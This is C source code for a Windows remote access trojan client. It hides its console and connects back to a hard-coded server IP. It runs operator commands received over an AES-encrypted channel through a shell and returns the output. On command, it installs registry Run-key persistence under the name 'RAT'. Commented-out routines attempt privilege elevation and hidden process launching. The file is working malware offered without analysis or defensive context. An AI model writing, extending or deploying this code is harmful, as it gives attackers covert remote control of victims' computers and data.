#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <winbase.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/ssl.h>
#include <openssl/applink.c>

#include "base64.h"

#pragma comment (lib, "Ws2_32.lib")

#define SVPORT 8008
#define CLPORT 8009

// BOOL IsUserAdmin()
// {
//     BOOL isAdmin = FALSE;
//     PSID administratorsGroup = NULL;
//
//     SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
//     if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup))
//     {
//         CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
//         FreeSid(administratorsGroup);
//     }
//
//     return isAdmin;
// }
//
// void PrintError()
// {
//     printf("Error code is: %d\n", GetLastError());
// }
//
// void appendNull(char **str)
// {
//     *str[strlen(*str) - 1] = '\0';
// }

// void appendStr(char **dest, const char *src)
// {
//     size_t newLen = strlen(*dest) + strlen(src) + 1;
//     *dest = realloc(*dest, newLen);
//     strcat(*dest, src);
// }

void sendall(int sockfd, unsigned char* buffer, size_t length)
{
    size_t sentTotal = 0;
    size_t sent = 0;

    while (sentTotal < length)
    {
        sent = send(sockfd, (const char*)buffer + sentTotal, length - sentTotal, 0);
        if (sent == -1)
        {
            perror("Send error\n");
            exit(EXIT_FAILURE);
        }

        sentTotal += sent;
    }
}

int encryptAES(unsigned char* plaintext, unsigned char* key, unsigned char* iv, unsigned char** ciphertext)
{
    EVP_CIPHER_CTX* ctx;
    int len;
    int plaintextLen = strlen((const char*)plaintext);
    int ciphertextLen;
    int blkSize = 16;
    int maxCipherLen = strlen(plaintext) + blkSize;

    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, *ciphertext, &len, plaintext, plaintextLen);
    ciphertextLen = len;
    EVP_EncryptFinal_ex(ctx, *ciphertext + len, &len);
    ciphertextLen += len;

    EVP_CIPHER_CTX_free(ctx);

    return ciphertextLen;
}

int decryptAES(unsigned char* ciphertext, int ciphertextLen, unsigned char* key, unsigned char* iv, unsigned char** decryptedtext)
{
    EVP_CIPHER_CTX* ctx;
    int len;
    int plaintextLen;

    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_DecryptUpdate(ctx, *decryptedtext, &len, ciphertext, ciphertextLen);
    plaintextLen = len;

    EVP_DecryptFinal_ex(ctx, *decryptedtext + len, &len);
    plaintextLen += len;

    EVP_CIPHER_CTX_free(ctx);

    return plaintextLen;
}



// void ELEVATE()
// {
//     if(IsUserAdmin())
//     {
//         printf("alr admin\n");
//         return;
//     }
//
//     char path[MAX_PATH];
//     HMODULE hModule = GetModuleHandle(NULL);
//     GetModuleFileName(hModule, path, MAX_PATH);
//
//     SHELLEXECUTEINFO sei;
//     sei.cbSize = sizeof(sei);
//     sei.lpVerb = "runas";
//     sei.lpFile = path;
//     sei.nShow = SW_SHOWNORMAL;
//     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
//
//     if(!ShellExecuteEx(&sei))
//     {
//         printf("ShellExecuteEx Failed: %lu\n", GetLastError());
//         return;
//     }
// }

// void EXECCOMMWOO(char *command)
// {
//     STARTUPINFO si;
//     PROCESS_INFORMATION pi;
//
//     ZeroMemory(&si, sizeof(si));
//     si.cb = sizeof(si);
//     ZeroMemory(&pi, sizeof(pi));
//
//     CreateProcess(NULL, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
//     WaitForSingleObject(pi.hProcess, INFINITE);
//
//     CloseHandle(pi.hProcess);
//     CloseHandle(pi.hThread);
// }

void PERSIST()
{
    HKEY hKey;
    LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR valueName = "RAT";
    LPCSTR newValue = "C:\\Windows\\RAT.exe";

    RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)newValue, strlen(newValue) + 1);
    RegCloseKey(hKey);
}

//APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
{
    HWND hWindow = GetConsoleWindow();
    ShowWindow(hWindow, SW_HIDE);


    DWORD pId = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId);
    if (hProcess == NULL)
    {
        printf("OpenProcess failed with error %lu\n", GetLastError());
        return 1;
    }
    FreeConsole();
    
    //SOCKET CONNECTOR
    WSADATA wsaData;

    char serverIP[] = "10.77.252.111";
    int serverPort = SVPORT;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    struct sockaddr_in serverInfo;
    serverInfo.sin_family = AF_INET;
    serverInfo.sin_addr.s_addr = inet_addr(serverIP);
    serverInfo.sin_port = htons(serverPort);
    printf("Connecting\n");

    while (connect(sockfd, (SOCKADDR*)&serverInfo, sizeof(serverInfo)) != 0)
    {
        printf("Reconnecting\n");
        Sleep(100);
    }

    unsigned char aes_key[32];
    recv(sockfd, aes_key, sizeof(aes_key), 0);

    char recvBuffer[1025];
    char container[1025];
    char resBuffer[524289];

    while (1)
    {
        memset(recvBuffer, 0, sizeof(recvBuffer));
        memset(container, 0, sizeof(container));
        memset(resBuffer, 0, sizeof(resBuffer));

        char recvAESLen[10];
        recvAESLen[10 - 1] = '\0';
        recv(sockfd, recvAESLen, sizeof(recvAESLen), 0);

        int aesCiphertextLen = atoi(recvAESLen);

        unsigned char* recvAESText = malloc(aesCiphertextLen + EVP_MAX_IV_LENGTH);
        int recvAESTextLen = aesCiphertextLen + EVP_MAX_IV_LENGTH;
        recv(sockfd, (char*)recvAESText, recvAESTextLen, 0);

        unsigned char iv[EVP_MAX_IV_LENGTH];
        unsigned char* aesCiphertext = malloc(aesCiphertextLen);
        memcpy(aesCiphertext, recvAESText, aesCiphertextLen);
        memcpy(iv, recvAESText + aesCiphertextLen, EVP_MAX_IV_LENGTH);

        unsigned char* aesPlaintext = malloc(aesCiphertextLen);
        int aesPlaintextLen = decryptAES(aesCiphertext, aesCiphertextLen, aes_key, iv, &aesPlaintext);
        aesPlaintext[aesPlaintextLen] = '\0';

        free(aesCiphertext);
        if (strncmp(aesPlaintext, "persist", strlen("persist") == 0))
        {
            PERSIST();
            free(aesPlaintext);
            free(recvAESText);
        }
        else
        {
            FILE* fp = _popen(aesPlaintext, "r");

            container[sizeof(container) - 1] = '\0';
            while (fgets(container, sizeof(container), fp) != NULL)
            {
                strncat(resBuffer, container, sizeof(container));
            }
            _pclose(fp);

            resBuffer[sizeof(resBuffer) - 1] = '\0';
            printf("%s\n", resBuffer);

            unsigned char* sendCiphertext = malloc(strlen(resBuffer) + 16);
            int sendCiphertextLen = encryptAES(resBuffer, aes_key, iv, &sendCiphertext);

            char sendAESLen[10];
            sendAESLen[10 - 1] = '\0';
            sprintf(sendAESLen, "%d", sendCiphertextLen);
            send(sockfd, sendAESLen, sizeof(sendAESLen), 0);
            Sleep(100);
            sendall(sockfd, sendCiphertext, sendCiphertextLen);

            free(aesPlaintext);
            free(sendCiphertext);
            free(recvAESText);
        }
    }
    return 0;
}